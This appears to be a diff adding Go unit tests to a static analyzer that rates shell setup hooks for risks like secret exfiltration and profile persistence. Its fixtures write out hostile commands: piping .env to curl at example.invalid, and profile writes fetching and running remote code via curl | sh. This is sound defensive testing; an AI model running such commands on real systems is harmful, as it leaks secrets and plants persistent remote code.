@@ -36,6 +36,133 @@ func TestRemoteContentExecutionFollowsSubstitutionAndVariableFlow(t *testing.T) 
 	}
 }
 
+func TestProjectSecretExfiltrationFlowVariants(t *testing.T) {
+	t.Parallel()
+
+	tests := []struct {
+		name    string
+		content string
+	}{
+		{name: "pipeline", content: `cat .env | curl --data-binary @- https://example.invalid/upload`},
+		{name: "substitution", content: `curl -d "$(cat .env)" https://example.invalid/upload`},
+		{name: "variable", content: "payload=$(cat .env)\ncurl -d \"$payload\" https://example.invalid/upload"},
+		{name: "same operation", content: `curl -F file=@.env https://example.invalid/upload`},
+	}
+	for _, test := range tests {
+		t.Run(test.name, func(t *testing.T) {
+			item := analyzedSDK(t, test.content+"\n", sdk.HookSetupProject)
+			got := findFinding(finding.AnalyzeSDK(item), "risk.project-secret-exfiltration")
+			if got == nil {
+				t.Fatalf("findings = %#v", finding.AnalyzeSDK(item))
+			}
+			if got.Severity != "critical" || len(got.Evidence) != 2 {
+				t.Fatalf("exfiltration finding = %#v", got)
+			}
+			if got.Evidence[0].ID != "project-sensitive-file-read" || got.Evidence[0].Value != ".env" ||
+				got.Evidence[1].ID != "external-send" || got.Evidence[1].FromOperationID == "" || got.Evidence[1].ToOperationID == "" {
+				t.Errorf("flow evidence = %#v", got.Evidence)
+			}
+		})
+	}
+}
+
+func TestProjectSecretExfiltrationRejectsDisconnectedAndUnavailableProject(t *testing.T) {
+	t.Parallel()
+
+	disconnected := analyzedSDK(t, "cat .env\ncurl -d public https://example.invalid/upload\n", sdk.HookSetupProject)
+	if got := findFinding(finding.AnalyzeSDK(disconnected), "risk.project-secret-exfiltration"); got != nil {
+		t.Fatalf("disconnected flow finding = %#v", got)
+	}
+
+	noProject := analyzedSDK(t, "cat /project/.env | curl --data-binary @- https://example.invalid/upload\n", sdk.HookSetupBase)
+	if got := findFinding(finding.AnalyzeSDK(noProject), "risk.project-secret-exfiltration"); got != nil {
+		t.Fatalf("unmounted project finding = %#v", got)
+	}
+}
+
+func TestCriticalExfiltrationSetsRiskFloorAndSourceSinkHighlights(t *testing.T) {
+	t.Parallel()
+
+	item := analyzedSDK(t, "curl -F file=@.env https://example.invalid/upload\n", sdk.HookSetupProject)
+	findings := finding.AnalyzeSDK(item)
+	assessment := finding.AssessSDK(item, findings)
+	if assessment.Risk.Score < 80 || assessment.Risk.Level != "critical" || assessment.ReviewPriority.Score < 80 {
+		t.Fatalf("assessment = %#v", assessment)
+	}
+	var highlight *finding.RiskHighlight
+	for index := range assessment.KeyRisks {
+		if assessment.KeyRisks[index].ID == "risk.project-secret-exfiltration" {
+			highlight = &assessment.KeyRisks[index]
+			break
+		}
+	}
+	if highlight == nil || len(highlight.Scopes) != 2 {
+		t.Fatalf("key risk highlight = %#v", highlight)
+	}
+	if highlight.Scopes[0].Value != ".env" || highlight.Scopes[1].Value != "file=@.env" {
+		t.Errorf("source/sink scopes = %#v", highlight.Scopes)
+	}
+}
+
+func TestStaticProfileEnvironmentWriteIsCalibratedToLowRisk(t *testing.T) {
+	t.Parallel()
+
+	for _, content := range []string{
+		"printf 'export FIXTURE=1\\n' > /etc/profile.d/fixture.sh\n",
+		"printf 'export FIXTURE=1\\n' | tee /etc/profile.d/fixture.sh\n",
+		"cat <<'EOF' > /etc/profile.d/fixture.sh\nexport FIXTURE=1\nEOF\n",
+		"cat <<EOF > /etc/profile.d/fixture.sh\nexport PATH=\"${SDK}/bin:\\$PATH\"\nEOF\n",
+	} {
+		item := analyzedSDK(t, content, sdk.HookSetupBase)
+		findings := finding.AnalyzeSDK(item)
+		profile := findFinding(findings, "risk.profile-environment-write")
+		if profile == nil || profile.Severity != "low" || profile.Weight != 10 || profile.Confidence != "high" {
+			t.Fatalf("profile finding = %#v; all = %#v", profile, findings)
+		}
+		if generic := findFinding(findings, "risk.persistence-write"); generic != nil {
+			t.Fatalf("profile write was counted twice: %#v", findings)
+		}
+		assessment := finding.AssessSDK(item, findings)
+		if assessment.Risk.Score != 10 || assessment.Risk.Level != "low" {
+			t.Errorf("profile assessment = %#v", assessment)
+		}
+	}
+}
+
+func TestUnsafeProfileWritesRemainGenericPersistenceRisk(t *testing.T) {
+	t.Parallel()
+
+	tests := []struct {
+		name    string
+		hook    sdk.HookName
+		content string
+	}{
+		{name: "remote redirect", hook: sdk.HookSetupBase, content: "curl https://example.invalid/profile > /etc/profile.d/fixture.sh\n"},
+		{name: "remote pipeline", hook: sdk.HookSetupBase, content: "curl https://example.invalid/profile | tee /etc/profile.d/fixture.sh\n"},
+		{name: "unknown content", hook: sdk.HookSetupBase, content: "printf '%s' \"$PROFILE_CONTENT\" > /etc/profile.d/fixture.sh\n"},
+		{name: "executable payload", hook: sdk.HookSetupBase, content: "printf 'curl https://example.invalid/payload | sh' > /etc/profile.d/fixture.sh\n"},
+		{name: "arbitrary script", hook: sdk.HookSetupBase, content: "printf 'rm -rf /tmp/fixture' > /etc/profile.d/fixture.sh\n"},
+		{name: "heredoc payload", hook: sdk.HookSetupBase, content: "cat <<'EOF' > /etc/profile.d/fixture.sh\ncurl https://example.invalid/payload | sh\nEOF\n"},
+		{name: "dynamic heredoc", hook: sdk.HookSetupBase, content: "cat <<EOF > /etc/profile.d/fixture.sh\nexport FIXTURE=$PROFILE_CONTENT\nEOF\n"},
+		{name: "command substitution heredoc", hook: sdk.HookSetupBase, content: "cat <<EOF > /etc/profile.d/fixture.sh\nexport FIXTURE=$(curl https://example.invalid/value)\nEOF\n"},
+		{name: "partial path", hook: sdk.HookSetupBase, content: "printf 'export FIXTURE=1' > \"/etc/profile.d/$PROFILE_NAME.sh\"\n"},
+		{name: "project lifecycle", hook: sdk.HookSetupProject, content: "printf 'export FIXTURE=1' > /etc/profile.d/fixture.sh\n"},
+		{name: "global profile", hook: sdk.HookSetupBase, content: "printf 'export FIXTURE=1' > /etc/profile\n"},
+		{name: "non shell suffix", hook: sdk.HookSetupBase, content: "printf 'export FIXTURE=1' > /etc/profile.d/fixture.conf\n"},
+	}
+	for _, test := range tests {
+		t.Run(test.name, func(t *testing.T) {
+			findings := finding.AnalyzeSDK(analyzedSDK(t, test.content, test.hook))
+			if generic := findFinding(findings, "risk.persistence-write"); generic == nil || generic.Severity != "medium" {
+				t.Fatalf("generic persistence finding = %#v; all = %#v", generic, findings)
+			}
+			if profile := findFinding(findings, "risk.profile-environment-write"); profile != nil {
+				t.Fatalf("unsafe write was lowered: %#v", profile)
+			}
+		})
+	}
+}
+
 func TestLifecycleRiskAndAssuranceUseHookContext(t *testing.T) {
 	t.Parallel()
 	item := analyzedSDK(t, "printf changed > /project/generated\n", sdk.HookCheckHealth)
@@ -45,6 +172,15 @@ func TestLifecycleRiskAndAssuranceUseHookContext(t *testing.T) {
 	}
 	if findFinding(findings, "assurance.read-only-health-check") != nil {
 		t.Fatalf("unexpected read-only assurance: %#v", findings)
+	}
+}
+
+func TestHealthCheckLifecycleRiskRequiresCombinedContext(t *testing.T) {
+	t.Parallel()
+	item := analyzedSDK(t, "printf changed > /project/generated\n", sdk.HookCheckHealth)
+	item.Hooks[0].Analysis.Context.ProjectMounted = false
+	if got := findFinding(finding.AnalyzeSDK(item), "risk.project-write-in-health-check"); got != nil {
+		t.Fatalf("finding matched without project-mounted context: %#v", got)
 	}
 }
 
